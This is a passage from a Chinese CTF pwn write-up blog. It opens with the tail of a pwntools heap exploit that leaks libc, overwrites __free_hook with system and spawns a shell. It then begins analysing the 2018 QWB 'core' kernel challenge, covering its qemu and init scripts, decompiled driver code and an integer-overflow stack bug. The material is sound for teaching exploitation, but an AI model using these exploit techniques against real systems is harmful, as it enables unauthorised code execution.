    sla<span class="token punctuation">(</span><span class="token string">':'</span><span class="token punctuation">,</span> str<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span>
    sla<span class="token punctuation">(</span><span class="token string">':'</span><span class="token punctuation">,</span> str<span class="token punctuation">(</span>sz<span class="token punctuation">)</span><span class="token punctuation">)</span>
    sa<span class="token punctuation">(</span><span class="token string">':'</span><span class="token punctuation">,</span> d<span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">md</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> sz<span class="token punctuation">,</span> d<span class="token punctuation">)</span><span class="token punctuation">:</span>
    sla<span class="token punctuation">(</span><span class="token string">'ce:'</span><span class="token punctuation">,</span> <span class="token string">'2'</span><span class="token punctuation">)</span>
    sla<span class="token punctuation">(</span><span class="token string">':'</span><span class="token punctuation">,</span> str<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span>
    sla<span class="token punctuation">(</span><span class="token string">':'</span><span class="token punctuation">,</span> str<span class="token punctuation">(</span>sz<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span>len<span class="token punctuation">(</span>d<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        sa<span class="token punctuation">(</span><span class="token string">':'</span><span class="token punctuation">,</span> d<span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">rm</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">:</span>
    sla<span class="token punctuation">(</span><span class="token string">'ce:'</span><span class="token punctuation">,</span> <span class="token string">'3'</span><span class="token punctuation">)</span>
    sla<span class="token punctuation">(</span><span class="token string">':'</span><span class="token punctuation">,</span> str<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">dp</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">:</span>
    sla<span class="token punctuation">(</span><span class="token string">'ce:'</span><span class="token punctuation">,</span> <span class="token string">'4'</span><span class="token punctuation">)</span>
    sla<span class="token punctuation">(</span><span class="token string">':'</span><span class="token punctuation">,</span> str<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">cre7</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    sla<span class="token punctuation">(</span><span class="token string">'ce:'</span><span class="token punctuation">,</span> <span class="token string">'5'</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">gift</span><span class="token punctuation">(</span>d<span class="token punctuation">)</span><span class="token punctuation">:</span>
    sla<span class="token punctuation">(</span><span class="token string">'ce:'</span><span class="token punctuation">,</span> <span class="token string">'666'</span><span class="token punctuation">)</span>
    sla<span class="token punctuation">(</span><span class="token string">':'</span><span class="token punctuation">,</span> d<span class="token punctuation">)</span>

<span class="token comment" spellcheck="true">#--------------------------exploit--------------------------</span>
<span class="token keyword">def</span> <span class="token function">exploit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    li<span class="token punctuation">(</span><span class="token string">'exploit...'</span><span class="token punctuation">)</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        ad<span class="token punctuation">(</span>i<span class="token punctuation">,</span> <span class="token number">0x18</span><span class="token punctuation">,</span> <span class="token string">'A'</span> <span class="token operator">*</span> <span class="token number">0x18</span><span class="token punctuation">)</span>

    rm<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
    md<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span>
    dp<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>

    ru<span class="token punctuation">(</span><span class="token string">':'</span><span class="token punctuation">)</span>
    leak <span class="token operator">=</span> u64<span class="token punctuation">(</span>ru<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span> <span class="token operator">+</span> b<span class="token string">'\x00\x00'</span><span class="token punctuation">)</span>
    heap <span class="token operator">=</span> leak <span class="token operator">-</span> <span class="token number">0x2a0</span>
    li<span class="token punctuation">(</span><span class="token string">'heap: '</span> <span class="token operator">+</span> hex<span class="token punctuation">(</span>heap<span class="token punctuation">)</span><span class="token punctuation">)</span>

    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        rm<span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">)</span>

    md<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span>
    md<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">0x18</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span>heap <span class="token operator">+</span> <span class="token number">0x250</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    ad<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0x18</span><span class="token punctuation">,</span> b<span class="token string">'A'</span><span class="token punctuation">)</span>
    ad<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0x18</span><span class="token punctuation">,</span> b<span class="token string">'A'</span><span class="token punctuation">)</span>

    gift<span class="token punctuation">(</span><span class="token string">'none'</span><span class="token punctuation">)</span>
    ru<span class="token punctuation">(</span><span class="token string">'0x'</span><span class="token punctuation">)</span>
    leak <span class="token operator">=</span> int<span class="token punctuation">(</span>r<span class="token punctuation">(</span><span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>
    offset <span class="token operator">=</span> <span class="token punctuation">(</span> <span class="token number">0x7f50cd676140</span> <span class="token operator">-</span> <span class="token number">0x7f50cd412000</span> <span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># remote</span>
    <span class="token comment" spellcheck="true">#offset = ( 0x7f6faf78a900 - 0x7f6faf53a000) # local</span>
    libc_base <span class="token operator">=</span> leak <span class="token operator">-</span> offset
    free_hook <span class="token operator">=</span> libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'__free_hook'</span><span class="token punctuation">]</span>
    system <span class="token operator">=</span> libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span>
    li<span class="token punctuation">(</span><span class="token string">'libc_base: '</span> <span class="token operator">+</span> hex<span class="token punctuation">(</span>libc_base<span class="token punctuation">)</span><span class="token punctuation">)</span>

    ad<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0x58</span><span class="token punctuation">,</span> b<span class="token string">'A'</span><span class="token punctuation">)</span>
    ad<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0x58</span><span class="token punctuation">,</span> b<span class="token string">'/bin/sh\x00'</span><span class="token punctuation">)</span>
    ad<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0x58</span><span class="token punctuation">,</span> b<span class="token string">'A'</span><span class="token punctuation">)</span>
    md<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span>
    md<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0x58</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span>free_hook<span class="token punctuation">)</span><span class="token punctuation">)</span>
    gift<span class="token punctuation">(</span><span class="token string">'A'</span><span class="token punctuation">)</span>
    gift<span class="token punctuation">(</span>p64<span class="token punctuation">(</span>system<span class="token punctuation">)</span><span class="token punctuation">)</span>
    db<span class="token punctuation">(</span><span class="token punctuation">)</span>
    rm<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
    <span class="token comment" spellcheck="true">#ad(5, 0x58, 'A')</span>



<span class="token keyword">def</span> <span class="token function">finish</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    ia<span class="token punctuation">(</span><span class="token punctuation">)</span>
    c<span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token comment" spellcheck="true">#--------------------------main-----------------------------</span>
<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>

    <span class="token keyword">if</span> LOCAL<span class="token punctuation">:</span>
        elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>elf_path<span class="token punctuation">)</span>
        <span class="token keyword">if</span> LIBC<span class="token punctuation">:</span>
            libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span>libc_path<span class="token punctuation">)</span>
            io <span class="token operator">=</span> elf<span class="token punctuation">.</span>process<span class="token punctuation">(</span>env <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">"LD_LIBRARY_PATH"</span> <span class="token punctuation">:</span> libs_path<span class="token punctuation">,</span> <span class="token string">"LD_PRELOAD"</span> <span class="token punctuation">:</span> libc_path<span class="token punctuation">}</span> <span class="token punctuation">)</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            io <span class="token operator">=</span> elf<span class="token punctuation">.</span>process<span class="token punctuation">(</span>env <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">"LD_LIBRARY_PATH"</span> <span class="token punctuation">:</span> libs_path<span class="token punctuation">}</span> <span class="token punctuation">)</span>

    <span class="token keyword">else</span><span class="token punctuation">:</span>
        elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>elf_path<span class="token punctuation">)</span>
        io <span class="token operator">=</span> remote<span class="token punctuation">(</span>server_ip<span class="token punctuation">,</span> server_port<span class="token punctuation">)</span>
        <span class="token keyword">if</span> LIBC<span class="token punctuation">:</span>
            libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span>libc_path<span class="token punctuation">)</span>

    exploit<span class="token punctuation">(</span><span class="token punctuation">)</span>
    finish<span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre>
<h1 id="强网杯-2018-core"><a href="#强网杯-2018-core" class="headerlink" title="强网杯 2018 core"></a>强网杯 2018 core</h1><p>一个kernel pwn，来入入手。</p>
<h3 id="如何解压cpio文件"><a href="#如何解压cpio文件" class="headerlink" title="如何解压cpio文件"></a>如何解压cpio文件</h3><pre class=" language-sh"><code class="language-sh">sudo pacman -S ark</code></pre>
<p>直接使用ark解压软件解压即可。</p>
<h2 id="保护-7"><a href="#保护-7" class="headerlink" title="保护"></a>保护</h2><h3 id="start-script"><a href="#start-script" class="headerlink" title="start script"></a>start script</h3><pre class=" language-sh"><code class="language-sh">qemu-system-x86_64 \
-m 64M \
-kernel ./bzImage \
-initrd  ./core.cpio \
-append "root=/dev/ram rw console=ttyS0 oops=panic panic=1 quiet kaslr" \
-s  \
-netdev user,id=t0, -device e1000,netdev=t0,id=nic0 \
-nographic  \</code></pre>
<p>开启了aslr保护</p>
<h3 id="driver"><a href="#driver" class="headerlink" title="driver"></a>driver</h3><pre><code>    Arch:     amd64-64-little
    RELRO:    No RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x0)</code></pre>
<p>有cannary保护</p>
<h3 id="init-script"><a href="#init-script" class="headerlink" title="init script"></a>init script</h3><pre class=" language-sh"><code class="language-sh">#!/bin/sh
mount -t proc proc /proc
mount -t sysfs sysfs /sys
mount -t devtmpfs none /dev
/sbin/mdev -s
mkdir -p /dev/pts
mount -vt devpts -o gid=4,mode=620 none /dev/pts
chmod 666 /dev/ptmx
cat /proc/kallsyms > /tmp/kallsyms
echo 1 > /proc/sys/kernel/kptr_restrict
echo 1 > /proc/sys/kernel/dmesg_restrict
ifconfig eth0 up
udhcpc -i eth0
ifconfig eth0 10.0.2.15 netmask 255.255.255.0
route add default gw 10.0.2.2 
insmod /core.ko

poweroff -d 120 -f &
setsid /bin/cttyhack setuidgid 1000 /bin/sh
echo 'sh end!\n'
umount /proc
umount /sys

poweroff -d 0  -f</code></pre>
<p>在上面init脚本中出现关机命令， 把它注释掉重新打包为cpio文件就不会自动关机了。</p>
<h2 id="程序逻辑"><a href="#程序逻辑" class="headerlink" title="程序逻辑"></a>程序逻辑</h2><h3 id="init-module函数"><a href="#init-module函数" class="headerlink" title="init_module函数"></a>init_module函数</h3><pre class=" language-c"><code class="language-c">__int64 <span class="token function">init_module</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
  core_proc <span class="token operator">=</span> <span class="token function">proc_create</span><span class="token punctuation">(</span><span class="token string">"core"</span><span class="token punctuation">,</span> <span class="token number">438LL</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>core_fops<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">printk</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>unk_2DE<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span></code></pre>
<h3 id="exit-core-函数"><a href="#exit-core-函数" class="headerlink" title="exit_core 函数"></a>exit_core 函数</h3><pre class=" language-c"><code class="language-c">__int64 <span class="token function">exit_core</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
  __int64 result<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// rax</span>

  <span class="token keyword">if</span> <span class="token punctuation">(</span> core_proc <span class="token punctuation">)</span>
    result <span class="token operator">=</span> <span class="token function">remove_proc_entry</span><span class="token punctuation">(</span><span class="token string">"core"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> result<span class="token punctuation">;</span>
<span class="token punctuation">}</span></code></pre>
<h3 id="core-ioctl函数"><a href="#core-ioctl函数" class="headerlink" title="core_ioctl函数"></a>core_ioctl函数</h3><pre class=" language-c"><code class="language-c">__int64 __fastcall <span class="token function">core_ioctl</span><span class="token punctuation">(</span>__int64 a1<span class="token punctuation">,</span> <span class="token keyword">int</span> a2<span class="token punctuation">,</span> __int64 a3<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
  __int64 v3<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// rbx</span>

  v3 <span class="token operator">=</span> a3<span class="token punctuation">;</span>
  <span class="token keyword">switch</span> <span class="token punctuation">(</span> a2 <span class="token punctuation">)</span>
  <span class="token punctuation">{</span>
    <span class="token keyword">case</span> <span class="token number">0x6677889B</span><span class="token punctuation">:</span>
      <span class="token function">core_read</span><span class="token punctuation">(</span>a3<span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token keyword">break</span><span class="token punctuation">;</span>
    <span class="token keyword">case</span> <span class="token number">0x6677889C</span><span class="token punctuation">:</span>
      <span class="token function">printk</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>unk_2CD<span class="token punctuation">)</span><span class="token punctuation">;</span>
      off <span class="token operator">=</span> v3<span class="token punctuation">;</span>
      <span class="token keyword">break</span><span class="token punctuation">;</span>
    <span class="token keyword">case</span> <span class="token number">0x6677889A</span><span class="token punctuation">:</span>
      <span class="token function">printk</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>unk_2B3<span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token function">core_copy_func</span><span class="token punctuation">(</span>v3<span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token keyword">break</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
  <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span></code></pre>
<h3 id="core-read函数"><a href="#core-read函数" class="headerlink" title="core_read函数"></a>core_read函数</h3><pre class=" language-c"><code class="language-c"><span class="token keyword">unsigned</span> __int64 __fastcall <span class="token function">core_read</span><span class="token punctuation">(</span>__int64 a1<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
  __int64 v1<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// rbx</span>
  __int64 <span class="token operator">*</span>v2<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// rdi</span>
  <span class="token keyword">signed</span> __int64 i<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// rcx</span>
  <span class="token keyword">unsigned</span> __int64 result<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// rax</span>
  __int64 v5<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp-50h] [rbp-50h]</span>
  <span class="token keyword">unsigned</span> __int64 v6<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp-10h] [rbp-10h]</span>

  v1 <span class="token operator">=</span> a1<span class="token punctuation">;</span>
  v6 <span class="token operator">=</span> <span class="token function">__readgsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">printk</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>unk_25B<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">printk</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>unk_275<span class="token punctuation">)</span><span class="token punctuation">;</span>
  v2 <span class="token operator">=</span> <span class="token operator">&amp;</span>v5<span class="token punctuation">;</span>
  <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">16LL</span><span class="token punctuation">;</span> i<span class="token punctuation">;</span> <span class="token operator">--</span>i <span class="token punctuation">)</span>
  <span class="token punctuation">{</span>
    <span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span>v2 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
    v2 <span class="token operator">=</span> <span class="token punctuation">(</span>__int64 <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>v2 <span class="token operator">+</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
  <span class="token function">strcpy</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>v5<span class="token punctuation">,</span> <span class="token string">"Welcome to the QWB CTF challenge.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  result <span class="token operator">=</span> <span class="token function">copy_to_user</span><span class="token punctuation">(</span>v1<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>v5 <span class="token operator">+</span> off<span class="token punctuation">,</span> <span class="token number">64LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span>result <span class="token punctuation">)</span>
    <span class="token keyword">return</span> <span class="token function">__readgsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span> <span class="token operator">^</span> v6<span class="token punctuation">;</span>
  __asm <span class="token punctuation">{</span> swapgs <span class="token punctuation">}</span>
  <span class="token keyword">return</span> result<span class="token punctuation">;</span>
<span class="token punctuation">}</span></code></pre>
<h3 id="core-copy-func"><a href="#core-copy-func" class="headerlink" title="core_copy_func"></a>core_copy_func</h3><pre class=" language-c"><code class="language-c"><span class="token keyword">signed</span> __int64 __fastcall <span class="token function">core_copy_func</span><span class="token punctuation">(</span><span class="token keyword">signed</span> __int64 a1<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
  <span class="token keyword">signed</span> __int64 result<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// rax</span>
  __int64 v2<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp-50h] [rbp-50h]</span>
  <span class="token keyword">unsigned</span> __int64 v3<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp-10h] [rbp-10h]</span>

  v3 <span class="token operator">=</span> <span class="token function">__readgsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">printk</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>unk_215<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> a1 <span class="token operator">></span> <span class="token number">63</span> <span class="token punctuation">)</span>
  <span class="token punctuation">{</span>
    <span class="token function">printk</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>unk_2A1<span class="token punctuation">)</span><span class="token punctuation">;</span>
    result <span class="token operator">=</span> <span class="token number">0xFFFFFFFFLL</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
  <span class="token keyword">else</span>
  <span class="token punctuation">{</span>
    result <span class="token operator">=</span> <span class="token number">0LL</span><span class="token punctuation">;</span>
    <span class="token function">qmemcpy</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>v2<span class="token punctuation">,</span> <span class="token operator">&amp;</span>name<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> __int16<span class="token punctuation">)</span>a1<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// vul</span>
  <span class="token punctuation">}</span>
  <span class="token keyword">return</span> result<span class="token punctuation">;</span>
<span class="token punctuation">}</span></code></pre>
<h2 id="漏洞点-1"><a href="#漏洞点-1" class="headerlink" title="漏洞点"></a>漏洞点</h2><p>若在core_copy_func函数中传入的参数为负数，造成整型溢出，即可实现堆栈溢出。</p>
<p>​    </p>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">Author: </span><span class="post-copyright-info"><a href="mailto:undefined">i0gan</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">Link: </span><span class="post-copyright-info"><a href="http://blog.i0gan.cn/2020/11/08/wp-other/">http://blog.i0gan.cn/2020/11/08/wp-other/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/wp/">wp</a></div><div class="post_share"><div class="social-share" data-image="/img/text_bg.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2020/11/08/tiesan-2020/"><img class="prev-cover" src="/img/text_bg.jpg" onerror="onerror=null;src='/img/404.jpg'"><div class="pagination-info"><div class="label">Previous Post</div><div class="prev_info">tiesan 2020</div></div></a></div><div class="next-post pull-right"><a href="/2020/11/06/wp-nssc-2020/"><img class="next-cover" src="/img/text_bg.jpg" onerror="onerror=null;src='/img/404.jpg'"><div class="pagination-info"><div class="label">Next Post</div><div class="next_info">NSSC 2020 CTF</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span> Related Articles</span></div><div class="relatedPosts-list"><div><a href="/2020/11/08/tiesan-2020/" title="tiesan 2020"><img class="cover" src="/img/text_bg.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2020-11-08</div><div class="title">tiesan 2020</div></div></a></div><div><a href="/2020/09/02/wp-2020-ciscn/" title="2020 CISCN PWN WP"><img class="cover" src="/img/text_bg.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2020-09-02</div><div class="title">2020 CISCN PWN WP</div></div></a></div><div><a href="/2020/09/01/wp-2020-qwb/" title="wp 2020强网杯"><img class="cover" src="/img/text_bg.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2020-09-01</div><div class="title">wp 2020强网杯</div></div></a></div><div><a href="/2020/06/18/wp-hfb-2020/" title="wp-hfb-2020"><img class="cover" src="/img/text_bg.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2020-06-18</div><div class="title">wp-hfb-2020</div></div></a></div><div><a href="/2020/09/26/wp-jk-2020/" title="极客巅峰2020"><img class="cover" src="/img/text_bg.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2020-09-26</div><div class="title">极客巅峰2020</div></div></a></div><div><a href="/2020/11/06/wp-nssc-2020/" title="NSSC 2020 CTF"><img class="cover" src="/img/text_bg.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2020-11-06</div><div class="title">NSSC 2020 CTF</div></div></a></div></div></div></div><div class="aside_content" id="aside_content"><div class="card-widget card-info"><div class="card-content"><div class="card-info-avatar is-center"><img class="avatar-img" src="/img/header.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/><div class="author-info__name">i0gan</div><div class="author-info__description">Even if a man has reached the top, he still needs to improve himself</div></div><div class="card-info-data"><div class="card-info-data-item is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">44</div></a></div><div class="card-info-data-item is-center"><a href="/tags/"><div class="headline">Tags</div><div class="length-num">19</div></a></div><div class="card-info-data-item is-center"><a href="/categories/"><div class="headline">Categories</div><div class="length-num">14</div></a></div></div><a class="button--animated" id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/i0gan"><i class="fab fa-github"></i><span>Follow Me</span></a></div></div><div class="card-widget card-announcement"><div class="card-content"><div class="item-headline"><i class="fas fa-bullhorn card-announcement-animation"></i><span>Announcement</span></div><div class="announcement_content">This is my Blog</div></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="card-content"><div class="item-headline"><i class="fas fa-stream"></i><span>Catalog</span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#OTHER-WRITE-UP-FOR-ME"><span class="toc-number">1.</span> <span class="toc-text">OTHER WRITE UP FOR ME</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#echoback"><span class="toc-number">2.</span> <span class="toc-text">echoback</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#checksec"><span class="toc-number">2.1.</span> <span class="toc-text">checksec</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#vul"><span class="toc-number">2.2.</span> <span class="toc-text">vul</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%9D%E8%B7%AF"><span class="toc-number">2.3.</span> <span class="toc-text">思路</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B3%84%E6%BC%8Flibc%E5%9F%BA%E5%9D%80"><span class="toc-number">2.4.</span> <span class="toc-text">泄漏libc基址</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B3%84%E6%BC%8Felf%E5%9F%BA%E5%9D%80"><span class="toc-number">2.5.</span> <span class="toc-text">泄漏elf基址</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B3%84%E6%BC%8F%E5%A0%86%E6%A0%88%E4%B8%ADmain-ret%E5%9C%B0%E5%9D%80"><span class="toc-number">2.6.</span> <span class="toc-text">泄漏堆栈中main ret地址</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%AE%E6%94%B9-IO-FILE%E5%B0%86%E6%95%B0%E6%8D%AE%E6%89%93%E5%85%A5stack"><span class="toc-number">2.7.</span> <span class="toc-text">修改_IO_FILE将数据打入stack</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#IO-FILE-struct"><span class="toc-number">2.7.0.1.</span> <span class="toc-text">_IO_FILE struct</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#IO-new-file-underflow"><span class="toc-number">2.7.1.</span> <span class="toc-text">_IO_new_file_underflow</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8"><span class="toc-number">2.7.2.</span> <span class="toc-text">利用</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9E%84%E9%80%A0rop%E9%93%BE"><span class="toc-number">2.8.</span> <span class="toc-text">构造rop链</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#getshell"><span class="toc-number">2.9.</span> <span class="toc-text">getshell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#exp"><span class="toc-number">2.10.</span> <span class="toc-text">exp</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#greeting-150"><span class="toc-number">3.</span> <span class="toc-text">greeting-150</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BF%9D%E6%8A%A4"><span class="toc-number">3.0.1.</span> <span class="toc-text">保护</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E"><span class="toc-number">3.0.2.</span> <span class="toc-text">漏洞</span></a></li><li class="toc-item 